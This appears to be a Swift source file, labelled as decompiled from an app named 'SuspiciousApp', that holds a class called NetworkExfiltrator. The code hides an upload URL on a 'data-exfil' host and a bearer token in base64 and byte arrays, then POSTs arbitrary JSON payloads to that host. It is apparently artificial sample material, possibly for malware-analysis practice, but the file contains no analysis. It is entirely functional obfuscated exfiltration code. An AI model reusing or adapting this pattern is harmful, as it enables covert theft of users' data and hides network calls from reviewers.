import Foundation

// Decompiled from binary: SuspiciousApp
// Build version: 4.2.1
// Obfuscation level: High

class NetworkExfiltrator {
    
    // Obfuscated string components - decompiled
    private let var_0x1a2b = "aHR0cHM6Ly8="
    private let var_0x1a2c = "ZGF0YS1leGZpbC5kYXJrbmV0d29yay5jb20="
    private let var_0x1a2d = "L2FwaS92Mi91cGxvYWQ="
    
    // Character code array - obfuscated
    private let var_0x3f4e: [UInt8] = [66, 101, 97, 114, 101, 114, 32]
    
    // Split credential components
    private let var_0x5b6c = "c2tfbGl2ZV8="
    private let var_0x5b6d = "NGI3ZjJhOGQ="
    private let var_0x5b6e = "M2UxY2Y5ODc="
    
    // HTTP method obfuscation - split across multiple vars
    private let var_0x7d8e: UInt8 = 80
    private let var_0x7d8f: UInt8 = 79
    private let var_0x7d90: UInt8 = 83
    private let var_0x7d91: UInt8 = 84
    
    // Decompiled computed property for protocol
    private var protocolComponent: String {
        guard let decoded = Data(base64Encoded: var_0x1a2b),
              let str = String(data: decoded, encoding: .utf8) else {
            return ""
        }
        return str
    }
    
    // Decompiled computed property for domain
    private var hostComponent: String {
        let encoded = var_0x1a2c
        guard let data = Data(base64Encoded: encoded),
              let decoded = String(data: data, encoding: .utf8) else {
            return ""
        }
        return decoded
    }
    
    // Decompiled computed property for path
    private var pathComponent: String {
        if let decodedData = Data(base64Encoded: var_0x1a2d) {
            return String(data: decodedData, encoding: .utf8) ?? ""
        }
        return ""
    }
    
    // Obfuscated method to build credential prefix
    private func getCredentialPrefix() -> String {
        var result = ""
        for byte in var_0x3f4e {
            result.append(Character(UnicodeScalar(byte)))
        }
        return result
    }
    
    // Decompiled credential assembly method
    private func assembleCredential() -> String {
        let prefix = getCredentialPrefix()
        
        // Decode base64 components
        guard let part1Data = Data(base64Encoded: var_0x5b6c),
              let part1 = String(data: part1Data, encoding: .utf8) else {
            return ""
        }
        
        guard let part2Data = Data(base64Encoded: var_0x5b6d),
              let part2 = String(data: part2Data, encoding: .utf8) else {
            return ""
        }
        
        guard let part3Data = Data(base64Encoded: var_0x5b6e),
              let part3 = String(data: part3Data, encoding: .utf8) else {
            return ""
        }
        
        // Concatenate all parts
        let token = part1 + part2 + part3
        return prefix + token
    }
    
    // Decompiled HTTP method builder
    private func getHTTPMethod() -> String {
        let bytes: [UInt8] = [var_0x7d8e, var_0x7d8f, var_0x7d90, var_0x7d91]
        var methodString = ""
        
        for byteValue in bytes {
            let char = Character(UnicodeScalar(byteValue))
            methodString.append(char)
        }
        
        return methodString
    }
    
    // Decompiled URL construction method
    private func constructTargetURL() -> String {
        let proto = protocolComponent
        let host = hostComponent
        let path = pathComponent
        
        // Redundant temporary variables - typical of decompiled code
        let temp_var1 = proto
        let temp_var2 = host
        let temp_var3 = path
        
        let fullURL = temp_var1 + temp_var2 + temp_var3
        return fullURL
    }
    
    // Decompiled network request setup
    func createExfiltrationRequest() -> URLRequest? {
        // Build complete URL
        let urlString = constructTargetURL()
        
        guard let url = URL(string: urlString) else {
            return nil
        }
        
        // Create request object
        var request = URLRequest(url: url)
        
        // Set HTTP method from obfuscated source
        let method = getHTTPMethod()
        request.httpMethod = method
        
        // Add authentication header
        let authValue = assembleCredential()
        request.addValue(authValue, forHTTPHeaderField: "Authorization")
        
        // Additional headers for obfuscation
        request.addValue("application/json", forHTTPHeaderField: "Content-Type")
        request.addValue("SuspiciousApp/4.2.1", forHTTPHeaderField: "User-Agent")
        
        return request
    }
    
    // Decompiled data exfiltration method
    func exfiltrateData(payload: [String: Any], completion: @escaping (Bool) -> Void) {
        guard let request = createExfiltrationRequest() else {
            completion(false)
            return
        }
        
        var mutableRequest = request
        
        // Serialize payload
        do {
            let jsonData = try JSONSerialization.data(withJSONObject: payload, options: [])
            mutableRequest.httpBody = jsonData
        } catch {
            completion(false)
            return
        }
        
        // Execute network request
        let session = URLSession.shared
        let task = session.dataTask(with: mutableRequest) { data, response, error in
            if let error = error {
                print("Exfiltration failed: \(error)")
                completion(false)
                return
            }
            
            if let httpResponse = response as? HTTPURLResponse {
                let success = (200...299).contains(httpResponse.statusCode)
                completion(success)
            } else {
                completion(false)
            }
        }
        
        task.resume()
    }
    
    // Decompiled helper method - obfuscated string verification
    private func verifyComponents() -> Bool {
        let url = constructTargetURL()
        let cred = assembleCredential()
        let method = getHTTPMethod()
        
        // Redundant checks - typical decompiled pattern
        if url.isEmpty { return false }
        if cred.isEmpty { return false }
        if method.isEmpty { return false }
        
        return true
    }
    
    // Decompiled initialization method
    init() {
        // Perform component verification on init
        let _ = verifyComponents()
    }
    
    // Additional obfuscated helper - character array to string
    private func charArrayToString(_ chars: [UInt8]) -> String {
        var result = ""
        for c in chars {
            result += String(Character(UnicodeScalar(c)))
        }
        return result
    }
    
    // Decompiled debug method (intentionally verbose)
    func debugPrintConfiguration() {
        let url = constructTargetURL()
        let method = getHTTPMethod()
        let credential = assembleCredential()
        
        print("--- Configuration Debug ---")
        print("Target URL: \(url)")
        print("HTTP Method: \(method)")
        print("Auth Credential: \(credential)")
        print("---------------------------")
    }
}

// Decompiled extension for additional obfuscation
extension NetworkExfiltrator {
    
    // Alternative method construction using different obfuscation
    func getRequestComponents() -> (url: String, credential: String, method: String) {
        return (
            url: constructTargetURL(),
            credential: assembleCredential(),
            method: getHTTPMethod()
        )
    }
}